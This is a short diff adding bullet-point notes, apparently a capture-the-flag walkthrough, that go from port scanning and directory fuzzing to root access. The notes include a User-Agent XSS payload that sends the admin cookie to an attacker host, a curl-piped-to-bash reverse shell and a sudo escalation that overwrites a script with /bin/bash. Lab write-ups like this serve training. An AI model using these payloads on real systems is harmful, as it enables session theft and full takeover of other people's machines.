@@ -1,0 +1,16 @@
+- nmap con servicios 22 ftp y 5000 serv web
+- access to webservice fuzz for directories , found dashboard
+- unauthorized access 
+- messageboxes try xss
+- bpsuite add to message and User-Agent que es lo que utilizan para checkear que tipo de navegador posee
+ <"img src=x onerror=fetch('http://tuIP/'+document.cookie);>
+- get admin cookie 
+- access to dashboard , try code and worked so get a revshell
+- burpsuite con un curl hacia el archivo revshell.sh|bash
+- we are in , get the user
+- sudo -l to check to which files i have access 
+- to /usr/bin/syscheck
+- cat and we see that the file run the file initdb.sh 
+- so we echo "/bin/bash" > initdb.sh
+- give execution permission 
+- run sudo /usr/bin/syscheck and we get root access
